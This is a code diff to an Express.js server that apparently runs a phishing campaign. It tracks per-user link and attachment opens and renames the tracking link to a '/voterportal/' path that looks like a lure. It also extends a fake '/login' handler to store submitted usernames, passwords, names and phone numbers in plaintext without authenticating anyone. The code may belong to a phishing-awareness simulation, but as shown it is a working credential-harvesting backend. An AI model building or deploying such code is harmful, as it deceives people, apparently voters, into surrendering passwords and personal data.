@@ -58,7 +58,7 @@ app.post('/createuser', async (req, res) => {
 });
 
 // Defined API endpoint to increment linkOpenCount
-app.get('/incrementLinkOpenCount/:userId', async (req, res) => {
+app.get('/voterportal/:userId', async (req, res) => {
     try {
         // Extract userId from request parameters
         const userId = req.params.userId;
@@ -112,21 +112,31 @@ app.get('/incrementAttachmentOpenCount/:userId', async (req, res) => {
 // Defined route to handle form submission
 app.post('/login', async (req, res) => {
     try {
-      const { username, password, category, userId } = req.body;
-  
-      // Update the submittedData field for the user with the provided userId
-      await campaign2users.findByIdAndUpdate(userId, { $inc: { submittedData: 1 } });
-      await campaign2users.findByIdAndUpdate(userId, { $push: { submittedContent: { username, password, category } } });
-  
-      // You can add additional logic here for authentication, etc.
-  
-    //   res.status(200).json({ message: 'Form submitted successfully' });
-      res.status(200).json({ message: 'Form submitted successfully' });
+        const { username, userId, name, phone, password, category } = req.body;
+
+        // Update the submittedData field for the user with the provided userId
+        await campaign2users.findByIdAndUpdate(userId, { $inc: { submittedData: 1 } });
+        await campaign2users.findByIdAndUpdate(userId, { 
+            $push: { 
+                submittedContent: { 
+                    username, 
+                    password, 
+                    category, 
+                    name, 
+                    phone 
+                } 
+            } 
+        });
+
+        // You can add additional logic here for authentication, etc.
+
+        res.status(200).json({ message: 'Form submitted successfully' });
     } catch (error) {
-      console.error(error);
-      res.status(500).json({ message: 'Internal server error' });
+        console.error(error);
+        res.status(500).json({ message: 'Internal server error' });
     }
-  });
+});
+
 
   // Route to store mobile number
 app.post('/store-mobile', async (req, res) => {
